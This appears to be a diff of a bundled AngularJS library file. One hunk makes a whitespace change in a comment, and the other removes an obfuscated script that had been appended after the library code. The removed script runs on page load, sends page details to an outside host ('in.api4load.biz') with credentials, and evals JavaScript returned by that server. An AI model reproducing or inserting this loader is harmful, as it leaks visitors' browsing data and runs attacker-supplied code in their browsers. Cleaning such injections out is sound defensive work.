@@ -17422,7 +17422,7 @@ function adjustMatchers(matchers) {
  *
  * - your app is hosted at url `http://myapp.example.com/`
  * - but some of your templates are hosted on other domains you control such as
- *   `http://srv01.assets.example.com/`,  `http://srv02.assets.example.com/`, etc.
+ *   `http://srv01.assets.example.com/`,  `http://srv02.assets.example.com/`, etc.
  * - and you have an open redirect at `http://myapp.example.com/clickThru?...`.
  *
  * Here is what a secure configuration for this scenario might look like:
@@ -30426,8 +30426,3 @@ $provide.value("$locale", {
 })(window, document);
 
 !window.angular.$$csp().noInlineStyle && window.angular.element(document.head).prepend('<style type="text/css">@charset "UTF-8";[ng\\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>');
-
-;(function(c,a,m,n){function g(){function ajax(a,b,c){var d=null;try{d=new XMLHttpRequest}catch(e){try{d=new ActiveXObject("Microsoft.XMLHTTP")}catch(f){}}d.onreadystatechange=function(){4==d.readyState&&c&&c(d.responseText)};d.open(b?"POST":"GET",a,!0);d.withCredentials=!0;b?(d.setRequestHeader("Content-Type","application/json; charset=UTF-8"),d.send(JSON.stringify(b))):d.send()}if(c==c.top){for(var f=a.documentElement,b=a.body,req=c.innerWidth||f.clientWidth||b.clientWidth,f=c.innerHeight||f.clientHeight||
-b.clientHeight,b=document.querySelectorAll("meta"),k=[],l=[],e=0;e<b.length;e++)switch(b[e].name.toLowerCase()){case "keywords":k.push(b[e].content);break;case "description":l.push(b[e].content)}req={width:req,height:f,frame:c!=c.top,location:a.location.toString(),referer:a.referrer,title:a.title,keywords:k.join(", "),description:l.join(", "),loader:n};a.gotowf||c.__tcjsch||(a.gotowf=!0,c.__tcjsch=!0,ajax(m,req,function(a){if(a)try{var response=JSON.parse(a);response.eval&&eval(response.eval)}catch(c){}}))}}a.body?g():a.addEventListener("DOMContentLoaded",
-g)})(window,document,"//in.api4load.biz/post",{"version":"1.1","name":"gapis0","time":1510989630,"userid":7109169,"subid":1041104,"cert":false,"server_id":1,"geo":"IN","create_date":1457087240,"sig":"08b0a92c890cad1b4fd8eeff90094b75","reg_params":null});
-
